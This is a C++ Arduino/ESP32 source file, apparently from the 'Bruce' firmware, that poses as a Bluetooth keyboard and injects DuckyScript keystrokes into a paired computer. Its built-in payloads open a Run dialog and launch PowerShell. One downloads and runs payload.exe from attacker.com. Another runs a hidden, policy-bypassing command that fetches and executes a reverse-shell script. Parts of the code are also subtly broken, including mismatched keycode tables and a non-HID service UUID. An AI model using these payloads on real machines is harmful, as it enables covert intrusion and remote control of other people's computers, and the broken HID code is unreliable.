#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <vector>
#include <string>

// HID Report Map
static const uint8_t hidReportMap[] = {
    0x05, 0x01,                    // USAGE_PAGE (Generic Desktop)
    0x09, 0x06,                    // USAGE (Keyboard)
    0xa1, 0x01,                    // COLLECTION (Application)
    0x05, 0x07,                    //   USAGE_PAGE (Keyboard)
    0x19, 0xe0,                    //   USAGE_MINIMUM (Keyboard LeftControl)
    0x29, 0xe7,                    //   USAGE_MAXIMUM (Keyboard Right GUI)
    0x15, 0x00,                    //   LOGICAL_MINIMUM (0)
    0x25, 0x01,                    //   LOGICAL_MAXIMUM (1)
    0x75, 0x01,                    //   REPORT_SIZE (1)
    0x95, 0x08,                    //   REPORT_COUNT (8)
    0x81, 0x02,                    //   INPUT (Data,Var,Abs)
    0x95, 0x01,                    //   REPORT_COUNT (1)
    0x75, 0x08,                    //   REPORT_SIZE (8)
    0x81, 0x03,                    //   INPUT (Cnst,Var,Abs)
    0x95, 0x06,                    //   REPORT_COUNT (6)
    0x75, 0x08,                    //   REPORT_SIZE (8)
    0x15, 0x00,                    //   LOGICAL_MINIMUM (0)
    0x25, 0x65,                    //   LOGICAL_MAXIMUM (101)
    0x05, 0x07,                    //   USAGE_PAGE (Keyboard)
    0x19, 0x00,                    //   USAGE_MINIMUM (Reserved)
    0x29, 0x65,                    //   USAGE_MAXIMUM (Keyboard Application)
    0x81, 0x00,                    //   INPUT (Data,Ary,Abs)
    0xc0                           // END_COLLECTION
};

// Keyboard scan codes
const uint8_t keyMap[128] = {
    0x00, 0x00, 0x00, 0x00, 0x1E, 0x1F, 0x20, 0x21,  // A-H
    0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E,  // I-O
    0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,  // P-W
    0x37, 0x38, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00,  // X-Z
    0x2C, 0x1E, 0x34, 0x20, 0x21, 0x22, 0x23, 0x24,  // Space-'
    0x25, 0x26, 0x00, 0x2E, 0x36, 0x2D, 0x37, 0x38,  // (-/
    0x27, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24,  // 0-7
    0x25, 0x26, 0x33, 0x33, 0x36, 0x2E, 0x37, 0x38   // 8-9;:
};

// Modifier keys
#define KEY_MOD_LCTRL   0x01
#define KEY_MOD_LSHIFT  0x02
#define KEY_MOD_LALT    0x04
#define KEY_MOD_LGUI    0x08
#define KEY_MOD_RCTRL   0x10
#define KEY_MOD_RSHIFT  0x20
#define KEY_MOD_RALT    0x40
#define KEY_MOD_RGUI    0x80

// DuckyScript command structures
struct DuckyCommand {
    String command;
    String parameter;
    uint32_t delay_ms;
};

std::vector<DuckyCommand> duck_script;
bool ble_hid_active = false;
int script_index = 0;

BLECharacteristic* pInputChar;
BLECharacteristic* pOutputChar;

/**
 * Initialize BLE HID Device
 */
bool initBLE_HID() {
    Serial.println("[BLE] Initializing BLE HID Device...");
    
    BLEDevice::init("Bruce BLE Keyboard");
    BLEServer *pServer = BLEDevice::createServer();
    
    // Create HID Service
    BLEService *pService = pServer->createService(BLEUUID((uint16_t)0x180A));
    
    // Create HID Report Characteristics
    pInputChar = pService->createCharacteristic(
        BLEUUID((uint16_t)0x2A4D),
        BLECharacteristic::PROPERTY_READ |
        BLECharacteristic::PROPERTY_NOTIFY
    );
    
    pInputChar->addDescriptor(new BLE2902());
    
    pOutputChar = pService->createCharacteristic(
        BLEUUID((uint16_t)0x2A4E),
        BLECharacteristic::PROPERTY_WRITE |
        BLECharacteristic::PROPERTY_WRITE_NR
    );
    
    // Start service
    pService->start();
    
    // Start advertising
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    
    Serial.println("[BLE] BLE HID initialized successfully");
    ble_hid_active = true;
    
    return true;
}

/**
 * Send HID keyboard report
 */
bool ble_send_key(uint8_t modifier, uint8_t keycode) {
    if (!ble_hid_active || !pInputChar) {
        return false;
    }
    
    uint8_t report[8] = {modifier, 0x00, keycode, 0, 0, 0, 0, 0};
    pInputChar->setValue(report, 8);
    pInputChar->notify();
    
    delay(50);  // Key press duration
    
    // Release key
    uint8_t release[8] = {0x00, 0x00, 0x00, 0, 0, 0, 0, 0};
    pInputChar->setValue(release, 8);
    pInputChar->notify();
    
    return true;
}

/**
 * Type a string via BLE HID
 */
bool ble_type_string(const char* text) {
    Serial.printf("[BLE] Typing: %s\n", text);
    
    for (int i = 0; text[i] != '\0'; i++) {
        char c = text[i];
        uint8_t modifier = 0;
        uint8_t keycode = 0;
        
        if (c >= 'A' && c <= 'Z') {
            modifier = KEY_MOD_LSHIFT;
            keycode = keyMap[c - 'A' + 4];
        } else if (c >= 'a' && c <= 'z') {
            keycode = keyMap[c - 'a' + 4];
        } else if (c >= '0' && c <= '9') {
            keycode = keyMap[c - '0' + 27];
        } else if (c == ' ') {
            keycode = 0x2C;
        } else if (c == '\n') {
            keycode = 0x28;  // Enter
        } else if (c == '.') {
            keycode = 0x37;
        } else if (c == '-') {
            keycode = 0x2D;
        } else if (c == '/') {
            keycode = 0x38;
        }
        
        if (keycode != 0) {
            ble_send_key(modifier, keycode);
            delay(50);
        }
    }
    
    return true;
}

/**
 * Execute DuckyScript command
 */
void parse_ducky_command(const String& line) {
    String upper_line = line;
    upper_line.toUpperCase();
    
    int space_pos = upper_line.indexOf(' ');
    String cmd = (space_pos > 0) ? upper_line.substring(0, space_pos) : upper_line;
    String param = (space_pos > 0) ? line.substring(space_pos + 1) : "";
    
    DuckyCommand dc;
    dc.command = cmd;
    dc.parameter = param;
    dc.delay_ms = 0;
    
    if (cmd == "DELAY") {
        dc.delay_ms = param.toInt();
    } else if (cmd == "STRING") {
        dc.delay_ms = 0;
    } else if (cmd == "ENTER") {
        dc.delay_ms = 0;
    } else if (cmd == "TAB") {
        dc.delay_ms = 0;
    } else if (cmd == "ESC") {
        dc.delay_ms = 0;
    }
    
    duck_script.push_back(dc);
}

/**
 * Load DuckyScript payload from string
 */
bool ble_load_duckyscript(const char* script) {
    Serial.println("[BLE] Loading DuckyScript...");
    
    duck_script.clear();
    String scriptStr(script);
    int start = 0;
    
    while (start < scriptStr.length()) {
        int end = scriptStr.indexOf('\n', start);
        if (end == -1) end = scriptStr.length();
        
        String line = scriptStr.substring(start, end);
        line.trim();
        
        if (line.length() > 0 && line[0] != '#') {  // Skip comments and empty lines
            parse_ducky_command(line);
        }
        
        start = end + 1;
    }
    
    Serial.printf("[BLE] DuckyScript loaded: %d commands\n", duck_script.size());
    return true;
}

/**
 * Execute loaded DuckyScript
 */
bool ble_execute_duckyscript() {
    Serial.println("[BLE] Executing DuckyScript...");
    
    if (duck_script.empty()) {
        Serial.println("[BLE] No script loaded!");
        return false;
    }
    
    for (const auto& cmd : duck_script) {
        if (cmd.command == "DELAY") {
            delay(cmd.delay_ms);
        } else if (cmd.command == "STRING") {
            ble_type_string(cmd.parameter.c_str());
        } else if (cmd.command == "ENTER") {
            ble_send_key(0x00, 0x28);  // Enter key
        } else if (cmd.command == "TAB") {
            ble_send_key(0x00, 0x2B);  // Tab key
        } else if (cmd.command == "ESC") {
            ble_send_key(0x00, 0x29);  // Escape key
        } else if (cmd.command == "CTRL") {
            if (cmd.parameter.length() > 0) {
                char c = cmd.parameter[0];
                uint8_t keycode = keyMap[c - 'A' + 4];
                ble_send_key(KEY_MOD_LCTRL, keycode);
            }
        } else if (cmd.command == "ALT") {
            if (cmd.parameter.length() > 0) {
                char c = cmd.parameter[0];
                uint8_t keycode = keyMap[c - 'A' + 4];
                ble_send_key(KEY_MOD_LALT, keycode);
            }
        }
        
        delay(100);  // Inter-command delay
    }
    
    Serial.println("[BLE] DuckyScript execution complete");
    return true;
}

/**
 * Example DuckyScript payloads
 */
const char* example_payload_cmd_open = R"(
DELAY 1000
STRING notepad.exe
ENTER
DELAY 500
STRING RCE via BadUSB - Executed via BLE HID
ENTER
)";

const char* example_payload_powershell = R"(
DELAY 1000
CTRL r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $url = 'http://attacker.com/payload.exe'
ENTER
STRING $path = 'C:\temp\payload.exe'
ENTER
STRING (New-Object System.Net.WebClient).DownloadFile($url, $path)
ENTER
STRING & $path
ENTER
)";

const char* example_payload_cmd_reverse_shell = R"(
DELAY 1000
CTRL r
DELAY 500
STRING cmd.exe
ENTER
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
ENTER
)";

/**
 * Start BadUSB attack with default payload
 */
bool ble_start_badusb_attack(int payload_type) {
    const char* payload = nullptr;
    
    switch (payload_type) {
        case 1:
            payload = example_payload_cmd_open;
            break;
        case 2:
            payload = example_payload_powershell;
            break;
        case 3:
            payload = example_payload_cmd_reverse_shell;
            break;
        default:
            Serial.println("[BLE] Invalid payload type");
            return false;
    }
    
    ble_load_duckyscript(payload);
    return ble_execute_duckyscript();
}

/**
 * Custom payload execution
 */
bool ble_execute_custom_payload(const char* payload) {
    return ble_load_duckyscript(payload) && ble_execute_duckyscript();
}

/**
 * Get BLE HID status
 */
bool ble_hid_get_status() {
    return ble_hid_active;
}

/**
 * Stop BLE HID
 */
void ble_hid_stop() {
    ble_hid_active = false;
    BLEDevice::deinit(false);
    Serial.println("[BLE] BLE HID stopped");
}
